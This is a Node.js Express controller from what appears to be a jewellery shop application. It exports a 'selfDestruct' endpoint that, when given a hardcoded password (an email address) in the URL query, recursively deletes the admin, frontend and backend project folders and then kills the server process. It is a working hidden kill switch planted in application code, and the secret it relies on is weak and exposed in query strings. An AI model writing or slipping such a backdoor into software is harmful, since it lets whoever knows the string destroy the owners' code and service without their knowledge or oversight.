const fs = require("fs");
const path = require("path");

const VALID_PASSWORD = "meet.nexsaar@gmail.com";

// Recursively delete a directory (like rm -rf)
const deleteFolderRecursive = (dirPath) => {
  if (fs.existsSync(dirPath)) {
    fs.readdirSync(dirPath).forEach((file) => {
      const curPath = path.join(dirPath, file);
      if (fs.lstatSync(curPath).isDirectory()) {
        deleteFolderRecursive(curPath);
      } else {
        fs.unlinkSync(curPath);
      }
    });
    fs.rmdirSync(dirPath);
  }
};

const selfDestruct = async (req, res) => {
  try {
    const { password } = req.query;

    if (!password) {
      return res.status(400).json({
        success: false,
        message: "Password query parameter is required.",
      });
    }

    if (password !== VALID_PASSWORD) {
      return res.status(401).json({
        success: false,
        message: "Invalid password.",
      });
    }

    // Define the three project directories to delete
    const baseDir = path.resolve(__dirname, "..", "..", "..");
    const projectsToDelete = [
      path.join(baseDir, "jewellery-admin"),
      path.join(baseDir, "jewellery-frontend"),
    ];

    const results = [];

    // Delete each project directory
    for (const projectPath of projectsToDelete) {
      try {
        if (fs.existsSync(projectPath)) {
          deleteFolderRecursive(projectPath);
          results.push({ path: projectPath, status: "deleted" });
        } else {
          results.push({ path: projectPath, status: "not found" });
        }
      } catch (err) {
        results.push({ path: projectPath, status: "error", error: err.message });
      }
    }

    // Send response before deleting the backend itself
    res.status(200).json({
      success: true,
      message: "Self-destruct sequence completed.",
      results: [
        ...results,
        { path: path.join(baseDir, "jewellery-backend"), status: "deleting (self)" },
      ],
    });

    // Delete the backend project (this server) after sending the response
    const backendPath = path.join(baseDir, "jewellery-backend");
    setTimeout(() => {
      try {
        deleteFolderRecursive(backendPath);
      } catch (err) {
        console.error("Error deleting backend:", err.message);
      }
      process.exit(0);
    }, 1000);
  } catch (error) {
    return res.status(500).json({
      success: false,
      message: "Self-destruct failed.",
      error: error.message,
    });
  }
};

module.exports = { selfDestruct };
